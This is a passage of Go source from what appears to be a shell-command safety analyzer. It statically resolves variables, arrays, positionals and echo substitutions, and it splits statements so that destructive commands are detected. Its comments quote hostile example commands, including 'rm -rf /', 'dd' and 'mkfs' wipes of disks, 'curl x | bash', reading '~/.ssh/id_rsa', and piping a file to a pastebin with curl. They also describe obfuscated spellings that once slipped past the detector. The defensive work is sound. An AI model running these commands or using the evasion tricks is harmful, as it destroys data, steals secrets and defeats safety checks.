// Both over-approximate scope the same way substitution.go's buildSymbolTable
// does (whole-file, last-write-wins). A nil *ExecSymbols means "nothing to
// resolve" and every resolver falls through to exactly today's behavior —
// resolution is additive, never weakening. See buildExecSymbols for the
// collection rules and #3089/#3091 for the full reasoning.
type ExecSymbols struct {
	scalars map[string]string
	arrays  map[string][]string
	// positionals holds bash's positional parameters ($1, $2, ... / $@ / $*)
	// as bound by `set -- <words>` (#3237), 0-based (positionals[0] is $1;
	// $0 is never one of these — see resolvePositional). Deliberately a
	// separate field from scalars/arrays rather than keyed into either map:
	// unlike a plain variable or array, positional parameters are rebound by
	// every function call, so a *syntax.FuncDecl body must see a table with
	// this field cleared (withoutPositionals) while scalars/arrays — which
	// are NOT function-scoped absent an explicit `local` this resolver
	// already doesn't track — pass through unchanged.
	positionals []string
}

// buildExecSymbols scans every CallExpr assignment in the file and returns the
// constant symbol table for those whose value is a statically resolvable
// literal — scalar `NAME=value` (#3089) and constant array literal
// `NAME=(a b c)` (#3091), plus array population via `read -a NAME <<<
// "literal"` (#3193) and positional-parameter binding via `set --
// <literals>` (#3237). Deliberately simple compared to
// internal/analyzer/substitution.go's buildSymbolTable (single pass, no
// decoder-pipeline folding, no multi-hop chain resolution): this only needs to
// catch the single-hop "NAME=literal; ... $NAME ..." / "NAME=(literals); ...
// ${NAME[@]} ..." shapes found by the #3089/#3091/#3193/#3237 corpus sweeps.
// shellparse cannot import the analyzer package (analyzer already imports
// shellparse), so this is a self-contained copy of the same conservative
// philosophy rather than a shared helper.
//
// Same over-approximation as substitution.go: assignments are collected from
// the WHOLE file regardless of branch/scope position, and a later assignment
// to the same name overwrites an earlier one in document-walk order. This can
// occasionally resolve a usage to the "wrong" (differently-scoped or
// differently-ordered) constant, but never to an attacker-controlled or
// dynamic value, and it only ever ADDS resolution — an unresolved case falls
// back to exactly today's behavior. See #3089 for the full reasoning.

// recordConstAssigns registers the constant scalar/array bindings of a set of
// assignments into the symbol tables. Shared by the CallExpr (`x=rm cmd`) and
// DeclClause (`export x=rm`) walkers so the two cannot diverge — the divergence
// itself was the bypass (#3248).
func recordConstAssigns(assigns []*syntax.Assign, scalars map[string]string, arrays map[string][]string) {
	for _, asn := range assigns {
		if asn.Name == nil || asn.Name.Value == "" {
			continue
		}
		switch {
		case asn.Index != nil:
			// Indexed assignment (NAME[0]=x) — a sparse/incremental build of an
			// array, not a constant literal. Out of scope: tracking it correctly
			// means modelling index order across statements, which the resolver
			// deliberately does not do (#3091).
			continue
		case asn.Array != nil:
			// Constant array literal NAME=(rm -rf /). Registered only when EVERY
			// element is a positional, fully-literal word — see literalArrayElems
			// for why it's all-or-nothing.
			if elems, ok := literalArrayElems(asn.Array); ok {
				arrays[asn.Name.Value] = elems
			}
		default:
			if val, ok := literalWordValue(asn.Value); ok {
				scalars[asn.Name.Value] = val
			}
		}
	}
}

func buildExecSymbols(file *syntax.File) *ExecSymbols {
	scalars := make(map[string]string)
	arrays := make(map[string][]string)
	var positionals []string
	sawShift := false
	syntax.Walk(file, func(n syntax.Node) bool {
		switch node := n.(type) {
		case *syntax.CallExpr:
			recordConstAssigns(node.Assigns, scalars, arrays)
			// `set -- <words>` binds the positional parameters — a binding
			// mechanism invisible to the Assigns-based cases above because
			// `set` is a plain builtin CallExpr, not a syntax.Assign (#3237).
			// Only the explicit `--` form is recognised, which sidesteps
			// `set`'s option parsing (`set -e`, `set -o pipefail`) entirely.
			if elems, ok := setPositionalElems(node); ok {
				positionals = elems
			}
			// `shift` removes/renumbers positional elements — an effect this
			// whole-file, order-independent table cannot model (unlike a
			// later assignment overwriting an earlier one, a shift changes
			// what EVERY subsequent index means). Recorded here and applied
			// as a global bail below rather than resolving a $1 read after a
			// shift to a value that already moved on.
			if isShiftCall(node) {
				sawShift = true
			}
		case *syntax.DeclClause:
			// `export x=rm`, `declare`, `local`, `readonly`, `typeset`.
			//
			// Bash parses these as *syntax.DeclClause, NOT as a CallExpr carrying
			// Assigns, so a walker keyed on CallExpr sees no binding at all. One
			// extra word therefore switched constant-symbol resolution off
			// entirely: measured on e778a77d, `y=rm; $y -rf /` BLOCKs while
			// `declare y=rm; $y -rf /` only AUDITs — same for export, typeset,
			// local and readonly (#3248, #3203).
			//
			// DequoteCommand already hit this wall in #2984 and grew its own
			// DeclClause case; the lesson stopped there, and both constant-symbol
			// collectors kept walking CallExpr only. Sharing recordConstAssigns
			// is what stops the two from drifting apart again.
			recordConstAssigns(DeclClauseAssigns(node), scalars, arrays)
		case *syntax.Stmt:
			// `read -a NAME <<< "literal"` populates NAME as an array via a
			// runtime builtin, not a syntax.Assign — invisible to the case
			// above even though it has the exact same effect as #3091's
			// `NAME=(literal words)`. See readArrayHereStringElems (#3193).
			//
			// #3193 modeled only that one spelling of "binding builtin fed by
			// a here-string". `read NAME`/`read -r NAME` (scalar, no -a) and
			// `mapfile`/`readarray` (array, one element per line) bind through
			// the exact same shape and are just as invisible to the CallExpr
			// case above (#3239).
			if name, elems, ok := readArrayHereStringElems(node); ok {
				arrays[name] = elems
			} else if name, val, ok := readScalarHereStringElem(node); ok {
				scalars[name] = val
			} else if name, elems, ok := mapfileHereStringElems(node); ok {
				arrays[name] = elems
			}
		}
		return true
	})
	if sawShift {
		positionals = nil
	}
	if len(scalars) == 0 && len(arrays) == 0 && len(positionals) == 0 {
		return nil
	}
	return &ExecSymbols{scalars: scalars, arrays: arrays, positionals: positionals}
}

// setPositionalElems recognizes the explicit-`--` form of `set` — `set --
// <words>` — and returns the words as the positional-parameter array it
// binds. All-or-nothing literalness, same as literalArrayElems: a single
// non-literal word bails the WHOLE binding rather than risk resolving a
// positional reference to a value that never actually runs (#3237). Only
// `set` followed immediately by a literal `--` is recognised — `set -e`,
// `set -o pipefail`, and any other option form are option parsing, not a
// positional binding, and must not be mistaken for one.
func setPositionalElems(call *syntax.CallExpr) ([]string, bool) {
	if len(call.Args) < 2 {
		return nil, false
	}
	exe, ok := literalWordValue(call.Args[0])
	if !ok || exe != "set" {
		return nil, false
	}
	marker, ok := literalWordValue(call.Args[1])
	if !ok || marker != "--" {
		return nil, false
	}
	elems := make([]string, 0, len(call.Args)-2)
	for _, w := range call.Args[2:] {
		val, ok := literalWordValue(w)
		if !ok {
			return nil, false
		}
		elems = append(elems, val)
	}
	return elems, true
}

// isShiftCall reports whether call is a `shift` invocation (bare, or with a
// literal numeric count) — see buildExecSymbols' shift handling (#3237).
func isShiftCall(call *syntax.CallExpr) bool {
	if len(call.Args) == 0 {
		return false
	}
	exe, ok := literalWordValue(call.Args[0])
	return ok && exe == "shift"
}

// withoutPositionals returns syms with positional-parameter bindings
// cleared, for walking into a *syntax.FuncDecl body: a function call rebinds
// $1..$N/$@/$* to its own arguments, so an outer `set --` must never resolve
// a $1 referenced inside a function (#3237). Scalars and arrays are NOT
// function-scoped in bash absent an explicit `local` (which this resolver
// already doesn't track), so they pass through unchanged — only positionals
// need this special case.
func withoutPositionals(syms *ExecSymbols) *ExecSymbols {
	if syms == nil || len(syms.positionals) == 0 {
		return syms
	}
	clone := *syms
	clone.positionals = nil
	return &clone
}

// containsFuncDecl reports whether file defines any function anywhere. Used
// by the regex-fallback entry points (BuildExecSymbolTable,
// ResolveIndirectExecutables) as a conservative whole-file bail on
// positional-parameter resolution: unlike the primary AST walk (walkStmt),
// those paths resolve a flat, scope-unaware table against statement text, so
// they cannot tell a `$1` usage inside a function body from one outside it.
// Disabling positional resolution entirely when a function is present anywhere
// avoids ever mis-resolving a function-scoped positional to an outer `set --`
// binding (#3237) — at the cost of not resolving positionals in scripts that
// also happen to define an unrelated function, a combination the corpus this
// fix targets does not exhibit.
func containsFuncDecl(file *syntax.File) bool {
	found := false
	syntax.Walk(file, func(n syntax.Node) bool {
		if found {
			return false
		}
		if _, ok := n.(*syntax.FuncDecl); ok {
			found = true
			return false
		}
		return true
	})
	return found
}

// readArrayHereStringElems recognizes the narrow, safe shape `read -a NAME
// <<< "literal"` / `read -ra NAME <<< "literal"` (any short-flag cluster
// containing 'a', in any order/combination with other read flags) and
// returns NAME's array elements as bash's default word-splitting would
// produce them.
//
// Two deliberate restrictions keep this conservative, matching the
// never-resolve-to-a-wrong-value philosophy documented on buildExecSymbols:
//
//   - stmt.Cmd's CallExpr must carry NO inline assignment prefix (`IFS=,
//     read -ra arr <<< "a,b,c"`). An IFS override changes word-splitting away
//     from default whitespace, and getting that wrong could silently
//     mis-resolve to a value that never actually runs. The existing
//     ts-audit-ifs-manipulation rule already flags the IFS-override variant
//     at AUDIT, so this is a lower-priority gap than the silent, unflagged
//     default-IFS miss #3193 closes.
//   - Only the here-string form (`<<<`) is recognized, never `cmd | read -a
//     NAME`. Bash runs the last stage of a pipeline in a subshell, so `cmd |
//     read -a NAME; use "${NAME[@]}"` can never actually populate NAME in the
//     parent shell — resolving it would be modeling an effect that doesn't
//     happen at runtime.
func readArrayHereStringElems(stmt *syntax.Stmt) (string, []string, bool) {
	call, ok := stmt.Cmd.(*syntax.CallExpr)
	if !ok || len(call.Assigns) > 0 || len(call.Args) < 2 {
		return "", nil, false
	}
	exe, ok := literalWordValue(call.Args[0])
	if !ok || exe != "read" {
		return "", nil, false
	}

	var name string
	for i := 1; i < len(call.Args)-1; i++ {
		flag, ok := literalWordValue(call.Args[i])
		if !ok || !isReadArrayFlag(flag) {
			continue
		}
		candidate, ok := literalWordValue(call.Args[i+1])
		if !ok || candidate == "" || strings.HasPrefix(candidate, "-") {
			continue
		}
		name = candidate
		break
	}
	if name == "" {
		return "", nil, false
	}

	val, ok := hereStringLiteral(stmt)
	if !ok {
		return "", nil, false
	}
	elems := strings.Fields(val)
	if len(elems) == 0 {
		return "", nil, false
	}
	return name, elems, true
}

// hereStringLiteral returns the literal text of stmt's `<<<` here-string
// redirect, if it has one and its word is fully literal (no ParamExp,
// CmdSubst, or other runtime-resolved part). Shared by every binding-builtin
// recognizer below (readArrayHereStringElems, readScalarHereStringElem,
// mapfileHereStringElems) so the here-string extraction rule — the redirect
// must exist and be literal, never a dynamic source — cannot drift between
// them.
func hereStringLiteral(stmt *syntax.Stmt) (string, bool) {
	for _, r := range stmt.Redirs {
		if r.Op != syntax.WordHdoc {
			continue
		}
		val, ok := literalWordValue(r.Word)
		if !ok {
			continue
		}
		return val, true
	}
	return "", false
}

// readScalarHereStringElem recognizes the narrow, safe shape `read NAME <<<
// "literal"` / `read -r NAME <<< "literal"` — bare or `-r`-only `read`, no
// array-mode flag, and exactly one NAME — and returns NAME's scalar value as
// bash's default-IFS single-NAME `read` produces it: leading/trailing IFS
// whitespace trimmed, internal whitespace preserved literally (#3239, the
// scalar sibling of #3193's array form — scalar `read` with no flags is the
// ordinary spelling; `-a` is the specialized one).
//
// Deliberately narrower than the full `read` flag grammar: any flag other
// than a bare `-r` bails, because several of read's other flags (-n, -t, -d,
// -p, -u, ...) consume the FOLLOWING word as a value rather than leaving it
// as a NAME, and disambiguating that is out of scope for this resolver.
// Bails on more than one NAME for the same reason the array form does — bash
// assigns the LAST name all remaining words when there are several, so
// resolving them independently could construct a value that never runs.
func readScalarHereStringElem(stmt *syntax.Stmt) (string, string, bool) {
	call, ok := stmt.Cmd.(*syntax.CallExpr)
	if !ok || len(call.Assigns) > 0 || len(call.Args) < 2 {
		return "", "", false
	}
	exe, ok := literalWordValue(call.Args[0])
	if !ok || exe != "read" {
		return "", "", false
	}

	var name string
	for _, arg := range call.Args[1:] {
		word, ok := literalWordValue(arg)
		if !ok {
			return "", "", false
		}
		if word == "-r" {
			continue
		}
		if strings.HasPrefix(word, "-") {
			// Any other flag — an array-mode flag (handled by
			// readArrayHereStringElems) or a value-taking flag like -n/-t/-d —
			// is out of scope for this narrow shape.
			return "", "", false
		}
		if name != "" {
			// A second NAME — bash's multi-name split, not modeled here.
			return "", "", false
		}
		name = word
	}
	if name == "" {
		return "", "", false
	}

	val, ok := hereStringLiteral(stmt)
	if !ok {
		return "", "", false
	}
	trimmed := strings.Trim(val, " \t\n")
	if trimmed == "" {
		return "", "", false
	}
	return name, trimmed, true
}

// mapfileHereStringElems recognizes the narrow, safe shape `mapfile [-t] NAME
// <<< "literal"` / `readarray [-t] NAME <<< "literal"` (readarray is a
// builtin alias for mapfile) and returns NAME's single-element array as bash
// would populate it from a single-line here-string (#3239).
//
// Only a bare or lone `-t` flag is recognized — mapfile takes several other
// flags (-n, -O, -s, -u, -C, -c) that either consume a following value or
// change which line becomes element 0, out of scope for the same reason
// readScalarHereStringElem stays off read's other flags.
//
// `-t` strips the trailing newline mapfile would otherwise keep on each
// line; without it, the newline survives into the array element. Both are
// recorded identically here — the newline only matters when this table later
// feeds resolveArrayIndex for a bare `${NAME[0]}` in EXECUTABLE position,
// where unquoted parameter expansion's own default-IFS word splitting strips
// a trailing newline the same way regardless of -t, so the distinction is
// invisible at that one call site. A multi-line literal (embedded `\n` inside
// the here-string's quoted word) bails entirely — mapfile would split it into
// more than one element, which this single-element table cannot represent.
func mapfileHereStringElems(stmt *syntax.Stmt) (string, []string, bool) {
	call, ok := stmt.Cmd.(*syntax.CallExpr)
	if !ok || len(call.Assigns) > 0 || len(call.Args) < 2 {
		return "", nil, false
	}
	exe, ok := literalWordValue(call.Args[0])
	if !ok || (exe != "mapfile" && exe != "readarray") {
		return "", nil, false
	}

	var name string
	for _, arg := range call.Args[1:] {
		word, ok := literalWordValue(arg)
		if !ok {
			return "", nil, false
		}
		if word == "-t" {
			continue
		}
		if strings.HasPrefix(word, "-") {
			return "", nil, false
		}
		if name != "" {
			return "", nil, false
		}
		name = word
	}
	if name == "" {
		return "", nil, false
	}

	val, ok := hereStringLiteral(stmt)
	if !ok || val == "" || strings.Contains(val, "\n") {
		return "", nil, false
	}
	return name, []string{val}, true
}

// isReadArrayFlag reports whether s is a short-flag cluster (e.g. "-a",
// "-ra", "-ar", "-rap") containing the array-mode flag 'a'. `read`'s flags
// have no long-opt form, so a leading "--" is never this.
func isReadArrayFlag(s string) bool {
	if len(s) < 2 || s[0] != '-' || strings.HasPrefix(s, "--") {
		return false
	}
	return strings.ContainsRune(s[1:], 'a')
}

// literalArrayElems renders a constant array literal's positional elements to
// their literal string values, in document order. It bails (ok=false) the
// moment any element is explicitly indexed (`a=([2]=rm)` — sparse/reordered,
// which makes the [@]/[*]/[<n>] mapping ambiguous) or non-literal
// (`a=("$x" rm)` — dynamic). All-or-nothing by construction: a partially- or
// wrongly-ordered array would mis-resolve to a command that never runs, so it
// is safer to skip the whole array than to register a lie (#3091).
func literalArrayElems(arr *syntax.ArrayExpr) ([]string, bool) {
	if arr == nil || len(arr.Elems) == 0 {
		return nil, false
	}
	elems := make([]string, 0, len(arr.Elems))
	for _, e := range arr.Elems {
		if e == nil || e.Index != nil {
			return nil, false
		}
		val, ok := literalWordValue(e.Value)
		if !ok {
			return nil, false
		}
		elems = append(elems, val)
	}
	return elems, true
}

// literalWordValue renders a Word to its literal string value, returning
// ok=false the moment any Part requires runtime resolution (ParamExp,
// CmdSubst, arithmetic, ...). Unlike materializeWord in substitution.go, this
// never consults a symbol table — it only accepts values that are already
// fully literal, which is sufficient for the "NAME=literal" assignment shape
// this resolver targets and keeps it independent of resolution order.
func literalWordValue(w *syntax.Word) (string, bool) {
	if w == nil {
		return "", true
	}
	var sb strings.Builder
	for _, p := range w.Parts {
		switch part := p.(type) {
		case *syntax.Lit:
			sb.WriteString(part.Value)
		case *syntax.SglQuoted:
			sb.WriteString(part.Value)
		case *syntax.DblQuoted:
			for _, dp := range part.Parts {
				switch dpart := dp.(type) {
				case *syntax.Lit:
					sb.WriteString(dpart.Value)
				case *syntax.SglQuoted:
					sb.WriteString(dpart.Value)
				default:
					return "", false
				}
			}
		default:
			return "", false
		}
	}
	return sb.String(), true
}

// resolveExecWord attempts to statically resolve a word used in EXECUTABLE
// position (call.Args[0]) to its real command name. Three shapes are handled:
//
//	$NAME / ${NAME}          — a bare ParamExp bound to a constant scalar (#3089).
//	${NAME[@]}/[*]/[<n>]     — an element (or whole) expansion of a constant
//	                            array literal (#3091).
//	$(echo LITERAL) / `...`  — a CmdSubst wrapping a single literal-only
//	                            `echo` invocation (#3089).
//
// All are deliberately narrow: anything fancier (parameter expansion with a
// default/slice/replace, a dynamic/arithmetic array index, a CmdSubst running
// something other than a bare echo) returns ok=false and the caller keeps the
// original unresolved word, exactly as before this fix.
func resolveExecWord(word *syntax.Word, syms *ExecSymbols) (string, bool) {
	if word == nil || len(word.Parts) != 1 {
		return "", false
	}
	return resolveExecPart(word.Parts[0], syms)
}

func resolveExecPart(p syntax.WordPart, syms *ExecSymbols) (string, bool) {
	switch part := p.(type) {
	case *syntax.ParamExp:
		return resolveExecParamExp(part, syms)
	case *syntax.DblQuoted:
		if len(part.Parts) != 1 {
			return "", false
		}
		return resolveExecPart(part.Parts[0], syms)
	case *syntax.CmdSubst:
		return resolveEchoCmdSubst(part)
	default:
		return "", false
	}
}

func resolveExecParamExp(part *syntax.ParamExp, syms *ExecSymbols) (string, bool) {
	if syms == nil || part.Param == nil || part.Param.Value == "" {
		return "", false
	}
	name := part.Param.Value

	// Array element expansion: ${a[@]}, ${a[*]}, ${a[<n>]}. Only a bare index
	// with no other modifier is safe to fold — a slice/replace/default/length/
	// negation layered on top of the index is dynamic, so bail exactly as the
	// scalar path below does. Handled before the scalar path because the shared
	// modifier guard rejects any Index (#3091).
	if part.Index != nil {
		if part.Slice != nil || part.Repl != nil || part.Exp != nil ||
			part.NestedParam != nil || part.Length || part.Width || part.Excl {
			return "", false
		}
		return resolveArrayIndex(name, part.Index, syms)
	}

	// An OPERATOR form (slice, replace, prefix/suffix removal, case change)
	// applied to a variable that is itself bound to a constant is still
	// statically computable — `x=rQm; ${x/Q/} -rf /` runs `rm -rf /` on every
	// shell, every time. Folding it is what closes the 76%-of-corpus bypass in
	// #3220; FoldConstantParamOp refuses anything it cannot compute exactly, so
	// an unfoldable operator lands on the same `return "", false` as before.
	// Scoped to the scalar table only — an operator applied to a positional
	// parameter (${1/Q/}) is not folded here; that is a distinct, still-open
	// gap on top of #3237's bare positional resolution.
	if part.Slice != nil || part.Repl != nil || part.Exp != nil ||
		part.NestedParam != nil || part.Length || part.Width || part.Excl {
		val, bound := syms.scalars[name]
		if !bound {
			return "", false
		}
		folded, ok := FoldConstantParamOp(val, part)
		// An empty executable name is not a command — reject rather than hand
		// the caller a segment whose Executable is "".
		if !ok || folded == "" {
			return "", false
		}
		return folded, true
	}
	// Positional parameters ($1..$N, $@, $*) resolve through `set --`
	// bindings (#3237) rather than the scalar map — checked first since a
	// bare digit or "@"/"*" can never be a real assigned variable name, but
	// kept as a distinct lookup rather than folded into syms.scalars so
	// withoutPositionals can clear ONLY this table when recursing into a
	// function body.
	if val, ok := resolvePositional(name, syms); ok {
		return val, ok
	}
	val, ok := syms.scalars[name]
	return val, ok
}

// resolvePositional resolves a bare positional-parameter reference ($1..$N
// via the simple $NAME/${NAME} shape, $@/$* via the same shape with
// name=="@"/"*") against syms.positionals, as bound by `set --` (#3237).
// Positionals are 1-based — positionals[0] is $1 — and $0 (the script/
// function name) is deliberately never resolved: n<1 rejects it rather than
// silently returning positionals[-1].
func resolvePositional(name string, syms *ExecSymbols) (string, bool) {
	if syms == nil || len(syms.positionals) == 0 {
		return "", false
	}
	switch name {
	case "@", "*":
		return strings.Join(syms.positionals, " "), true
	default:
		n, err := strconv.Atoi(name)
		if err != nil || n < 1 || n > len(syms.positionals) {
			return "", false
		}
		return syms.positionals[n-1], true
	}
}

// resolveArrayIndex folds ${NAME[idx]} to its constituent word(s) when NAME is
// a constant array literal in syms. Three index shapes resolve:
//
//	[@] / [*]  ->  every element, space-joined   ("${a[@]}" with a=(rm -rf /)
//	               becomes "rm -rf /")
//	[<n>]      ->  the single element at constant index n
//
// Anything else (an arithmetic or parameter-valued index, a negative or
// out-of-range index) returns ok=false, leaving the word unresolved. [@] and
// [*] both flatten to a single space-joined string here because the resolver
// produces one replacement word for the executable slot — the runtime
// word-splitting distinction between them doesn't change which command
// name/args the detector must ultimately see (#3091).
func resolveArrayIndex(name string, idx syntax.ArithmExpr, syms *ExecSymbols) (string, bool) {
	elems, ok := syms.arrays[name]
	if !ok || len(elems) == 0 {
		return "", false
	}
	lit := arithmLiteral(idx)
	switch lit {
	case "":
		return "", false // dynamic/arithmetic index — not statically known
	case "@", "*":
		return strings.Join(elems, " "), true
	default:
		n, err := strconv.Atoi(lit)
		if err != nil || n < 0 || n >= len(elems) {
			return "", false
		}
		return elems[n], true
	}
}

// arithmLiteral extracts a purely-literal array index expression — the "@"/"*"
// of ${a[@]}/${a[*]} or the "0" of ${a[0]} — as a string, returning "" for
// anything that needs runtime evaluation (arithmetic like ${a[$i+1]}, a nested
// parameter, ...). mvdan.cc/sh models the subscript as an ArithmExpr; the
// constant forms this resolver accepts parse as a single-Lit *syntax.Word.
func arithmLiteral(a syntax.ArithmExpr) string {
	w, ok := a.(*syntax.Word)
	if !ok || len(w.Parts) != 1 {
		return ""
	}
	lit, ok := w.Parts[0].(*syntax.Lit)
	if !ok {
		return ""
	}
	return lit.Value
}

// resolveEchoCmdSubst resolves "$(echo a b)" / "`echo a b`" (backquote and
// $(...) are the same AST node, distinguished only by CmdSubst.Backquote) to
// "a b" when the body is a single statement calling `echo` with only literal
// arguments. Anything else (a pipeline, multiple statements, a non-echo
// command, a non-literal argument) bails — this is intentionally narrow, not
// a general command-substitution evaluator.
func resolveEchoCmdSubst(cs *syntax.CmdSubst) (string, bool) {
	if len(cs.Stmts) != 1 || cs.Stmts[0] == nil {
		return "", false
	}
	call, ok := cs.Stmts[0].Cmd.(*syntax.CallExpr)
	if !ok || len(call.Assigns) != 0 || len(call.Args) < 2 {
		return "", false
	}
	name, ok := literalWordValue(call.Args[0])
	if !ok || NormalizeExecName(name) != "echo" {
		return "", false
	}
	var parts []string
	for _, w := range call.Args[1:] {
		val, ok := literalWordValue(w)
		if !ok {
			return "", false
		}
		// Skip echo's own flags (-n/-e/-E) rather than folding them into the
		// resolved command name.
		if val == "-n" || val == "-e" || val == "-E" {
			continue
		}
		parts = append(parts, val)
	}
	if len(parts) == 0 {
		return "", false
	}
	return strings.Join(parts, " "), true
}

// isProcSubstSourceExec reports whether exe reads a target argument's
// CONTENT and executes it as shell source: the "source"/"." builtins always
// do (regardless of any shebang line), and the shell interpreter binaries do
// too when given a bare path/fd argument. Deliberately excludes eval/exec
// (bash's ENOEXEC-fallback semantics for those are less clean to reason
// about and are not covered by the sibling curl/wget-keyword regex rules
// either) and python/node/ruby/perl (matches InlineCodeFragments' "SHELL
// sources only" scope — see its doc comment).
func isProcSubstSourceExec(exe string) bool {
	return exe == "source" || exe == "." || IsShellInterpreter(exe)
}

// resolveProcSubstLiteral resolves an input process substitution
// ("<(echo ...)" / "<(printf ...)") to the literal text it would write to
// its anonymous fifo, when the body is a single statement calling echo/printf
// with only literal arguments. Mirrors resolveEchoCmdSubst's narrow
// echo-only scope, extended to printf (a common shape for a payload needing
// no trailing newline) and to ProcSubst instead of CmdSubst. Anything else
// (output substitution ">(...)", a pipeline, multiple statements, a
// non-echo/printf command, a non-literal argument, or a printf call taking
// extra interpolation args beyond a bare format string) bails — this is
// intentionally narrow, not a general process-substitution evaluator.
func resolveProcSubstLiteral(ps *syntax.ProcSubst) (string, bool) {
	if ps.Op != syntax.CmdIn {
		return "", false
	}
	if len(ps.Stmts) != 1 || ps.Stmts[0] == nil {
		return "", false
	}
	call, ok := ps.Stmts[0].Cmd.(*syntax.CallExpr)
	if !ok || len(call.Assigns) != 0 || len(call.Args) < 2 {
		return "", false
	}
	name, ok := literalWordValue(call.Args[0])
	if !ok {
		return "", false
	}
	name = NormalizeExecName(name)
	if name != "echo" && name != "printf" {
		return "", false
	}
	// printf's remaining words are format + interpolation args, not plain
	// text — only accept the unambiguous bare-format-string shape.
	if name == "printf" && len(call.Args) != 2 {
		return "", false
	}
	var parts []string
	for _, w := range call.Args[1:] {
		val, ok := literalWordValue(w)
		if !ok {
			return "", false
		}
		if name == "echo" && (val == "-n" || val == "-e" || val == "-E") {
			continue
		}
		parts = append(parts, val)
	}
	if len(parts) == 0 {
		return "", false
	}
	return strings.Join(parts, " "), true
}

// wordProcSubstLiteral resolves w to the literal text a process substitution
// it wraps would write to its anonymous fifo, when w is a bare "<(...)" with
// nothing else concatenated onto it. Shared by the argument-position scan in
// callExprToSegment (#3190) and the stdin-redirect-target scan in walkStmt
// (#3242) so the two cannot drift apart the way HeredocBody's extraction
// once lived only at the top level.
func wordProcSubstLiteral(w *syntax.Word) (string, bool) {
	if w == nil || len(w.Parts) != 1 {
		return "", false
	}
	ps, ok := w.Parts[0].(*syntax.ProcSubst)
	if !ok {
		return "", false
	}
	return resolveProcSubstLiteral(ps)
}

// isStdinFD reports whether a redirect's file-descriptor word n targets fd 0
// — either because n is nil (the default fd for a `<`-family redirect is 0)
// or because n's literal value is "0" (`0< <(...)`). Used to scope the
// stdin-process-substitution capture in walkStmt to the actual stdin
// redirect a shell interpreter reads its source from, not some unrelated
// numbered fd a script happens to redirect from a process substitution too.
func isStdinFD(n *syntax.Lit) bool {
	return n == nil || n.Value == "0"
}

// fallbackParse handles commands that mvdan.cc/sh can't parse.
func fallbackParse(command string) *ParsedCommand {
	pc := &ParsedCommand{}
	parts := strings.Split(command, "|")
	for i, part := range parts {
		part = strings.TrimSpace(part)
		if part == "" {
			continue
		}
		words := strings.Fields(part)
		words = StripExecWrappers(words)
		exe := NormalizeExecName(words[0])
		seg := CommandSegment{
			Raw:        part,
			Executable: exe,
			Flags:      make(map[string]string),
			IsShell:    IsShellInterpreter(exe),
			// Quote-blind here too (this whole path only runs when the real
			// shell parser already failed on the command), but keeping it
			// populated means callers have one field to rely on instead of
			// needing a nil check for this fallback specifically.
			RawWords: words[1:],
		}
		for _, w := range words[1:] {
			if strings.HasPrefix(w, "-") {
				for _, ch := range w[1:] {
					seg.Flags[string(ch)] = ""
				}
			} else {
				seg.Args = append(seg.Args, w)
			}
		}
		pc.Segments = append(pc.Segments, seg)
		if i < len(parts)-1 {
			pc.Operators = append(pc.Operators, "|")
		}
	}
	return pc
}

// SplitTopLevelStatements splits a raw command string into the literal source
// text of each top-level statement — the leaf commands joined by &&, ||, ;,
// |, or a bare newline. Unlike Segments (which reconstructs argument text via
// the AST printer), this returns byte-offset slices of the ORIGINAL string,
// so backslash-continuations and heredoc bodies stay exactly as written.
//
// This is what IntentClassifier needs to scope command_intent_exclude per
// statement instead of over the whole raw command: without it, an unrelated
// dangerous statement chained via ";"/"&&" next to a doc-text-shaped one
// (e.g. `cat ~/.ssh/id_rsa; git commit -m "notes"`) gets the WHOLE command
// excused as "doc text", silently defeating the exclusion's purpose (see
// intent.go's IntentExcludedForStatements).
//
// Falls back to a single-element slice containing the original command when
// the shell syntax can't be parsed — callers degrade to "treat it as one
// statement", matching pre-existing whole-command behavior exactly.
func SplitTopLevelStatements(command string) []string {
	reader := strings.NewReader(command)
	parser := syntax.NewParser(syntax.KeepComments(false), syntax.Variant(syntax.LangBash))
	file, err := parser.Parse(reader, "")
	if err != nil {
		return []string{command}
	}

	var leaves []*syntax.Stmt
	for _, stmt := range file.Stmts {
		collectStmts(stmt, &leaves, true)
	}
	return stmtsToSource(command, leaves)
}

// stmtsToSource maps each collected statement back to its literal source text.
func stmtsToSource(command string, leaves []*syntax.Stmt) []string {
	if len(leaves) == 0 {
		return []string{command}
	}

	out := make([]string, 0, len(leaves))
	for _, s := range leaves {
		start := int(s.Pos().Offset())
		end := int(s.End().Offset())
		// A heredoc body is lexically separate from the statement's own
		// span (it's the redirect's Hdoc word, read after the following
		// newline) — extend end to cover it so the body's text stays
		// attached to the statement that opened it.
		for _, redir := range s.Redirs {
			if redir.Hdoc != nil {
				if hEnd := int(redir.Hdoc.End().Offset()); hEnd > end {
					end = hEnd
				}
			}
		}
		if start >= 0 && end <= len(command) && start <= end {
			out = append(out, command[start:end])
		}
	}
	if len(out) == 0 {
		return []string{command}
	}
	return out
}

// SplitSequencedStatements is SplitTopLevelStatements with one difference: a
// PIPELINE stays a single statement instead of being split into its components.
//
// This is the boundary an anchored ("^...") pack rule means by "the command
// being run". For a sequence — ";", "&&", "||", a newline, or a compound body —
// each element genuinely is its own command, so "^mkfs" should match the second
// element of "cd /tmp && mkfs.ext4 /dev/sda1". For a pipeline it is not: in
// "cat notes.md | curl -d @- https://pastebin.example.com" the curl is a pipe
// SINK, not the command being run, and matching a head-anchored rule against it
// changes what that rule means. Pipe sinks are the dataflow and structural
// analyzers' job (they model source→sink taint), not anchored regex's.
//
// Used by the regex analyzer's per-statement retry (#3045).
func SplitSequencedStatements(command string) []string {
	reader := strings.NewReader(command)
	parser := syntax.NewParser(syntax.KeepComments(false), syntax.Variant(syntax.LangBash))
	file, err := parser.Parse(reader, "")
	if err != nil {
		return []string{command}
	}

	var leaves []*syntax.Stmt
	for _, stmt := range file.Stmts {
		collectStmts(stmt, &leaves, false)
	}
	return stmtsToSource(command, leaves)
}

// StripCommandPrefixes removes anything that sits BEFORE the command word of a
// statement — leading environment assignments and a `!` negation — and returns
// the remainder. It returns "" when there is nothing to strip or the input
// cannot be parsed, so callers can cheaply skip the no-op case.
//
//	"LC_ALL=C dd if=/dev/zero of=/dev/sda"  ->  "dd if=/dev/zero of=/dev/sda"
//	"FOO=1 BAR=2 mkfs.ext4 /dev/sda1"       ->  "mkfs.ext4 /dev/sda1"
//	"! dd if=/dev/zero of=/dev/sda"         ->  "dd if=/dev/zero of=/dev/sda"
//	"LC_ALL=C curl x | bash"                ->  "curl x | bash"   (pipeline kept)
//	"rm -rf /"                              ->  ""                (nothing to do)
//
// Why this exists (issue #3048, follow-up to #3045): rules anchored with "^"
// are defeated by ANY prefix, and an environment assignment is the most common
